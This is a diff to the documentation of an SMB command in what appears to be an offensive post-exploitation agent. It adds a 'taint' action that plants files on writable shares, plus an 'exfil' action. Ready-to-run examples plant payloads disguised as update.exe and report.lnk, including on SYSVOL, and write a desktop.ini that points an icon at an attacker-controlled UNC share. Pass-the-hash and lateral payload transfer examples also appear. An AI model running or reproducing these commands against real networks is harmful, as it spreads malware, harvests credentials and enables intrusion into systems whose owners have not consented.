@@ -15,7 +15,7 @@ Uses the `go-smb2` library for SMB2 protocol operations (pure Go, CGO_ENABLED=0)
 
 Argument | Required | Description
 ---------|----------|------------
-action | Yes | Operation: `shares`, `ls`, `cat`, `upload`, `rm`, `mkdir`, `mv`, `push` (lateral tool transfer)
+action | Yes | Operation: `shares`, `ls`, `cat`, `upload`, `rm`, `mkdir`, `mv`, `push` (lateral tool transfer), `taint` (plant files on writable shares), `exfil` (data exfiltration)
 host | Yes | Target host IP or hostname
 username | Yes | Username for NTLM auth (supports `DOMAIN\user` or `user@domain` format)
 password | No* | Password for NTLM auth (*required unless `-hash` is provided)
@@ -25,7 +25,8 @@ share | Conditional | Share name (e.g., `C$`, `ADMIN$`, `SYSVOL`). Required for 
 path | Conditional | Path within the share. Required for cat, upload, rm, mkdir, mv, push. For mv, this is the source path.
 content | Conditional | File content to write (required for upload action)
 destination | Conditional | Target path within the share (required for mv action)
-source | Conditional | Local file path on the agent to push (required for push action)
+source | Conditional | Local file path on the agent to push (required for push and taint actions)
+plant_name | No | Filename to plant on shares (for taint action, e.g., `update.exe`). Defaults to source filename.
 port | No | SMB port (default: 445)
 
 ## Usage
@@ -69,6 +70,21 @@ Push a local file to a remote share (lateral tool transfer):
 ```
 smb -action push -host 192.168.1.1 -share C$ -path temp/payload.exe -source /tmp/payload.exe -username admin -password pass -domain CORP
 smb -action push -host dc01 -share ADMIN$ -path payload.exe -source /opt/tools/fawkes.exe -username admin -hash 8846f7eaee8fb117 -domain CORP
+```
+
+Taint shared content — plant a file on all writable shares (T1080):
+```
+smb -action taint -host 192.168.1.1 -source /tmp/payload.exe -plant_name update.exe -username admin -password pass -domain CORP
+```
+
+Taint a specific share:
+```
+smb -action taint -host 192.168.1.1 -share SYSVOL -source /tmp/backdoor.lnk -plant_name report.lnk -username admin -hash 8846f7eaee8fb117 -domain CORP
+```
+
+Taint with inline content (e.g., a desktop.ini):
+```
+smb -action taint -host 192.168.1.1 -content "[.ShellClassInfo]\nIconResource=\\attacker\share\icon.dll,0" -plant_name desktop.ini -username admin -password pass -domain CORP
 ```
 
 ### Pass-the-Hash (PTH)
@@ -152,6 +168,7 @@ On Windows, `make-token` creates an impersonation token from credentials. While 
 | Delete file on remote host | `smb -action rm` |
 | Create directory on remote host | `smb -action mkdir` |
 | Rename/move file on remote host | `smb -action mv` |
+| Plant file on writable shares | `smb -action taint` |
 | List files locally | `ls` |
 | Copy file locally | `cp` |
 | Read file locally | `cat` |
@@ -167,6 +184,7 @@ On Windows, `make-token` creates an impersonation token from credentials. While 
 ## MITRE ATT&CK Mapping
 
 - **T1021.002** - Remote Services: SMB/Windows Admin Shares
+- **T1080** - Taint Shared Content (taint action)
 - **T1550.002** - Use Alternate Authentication Material: Pass the Hash
 - **T1570** - Lateral Tool Transfer (push action)
 
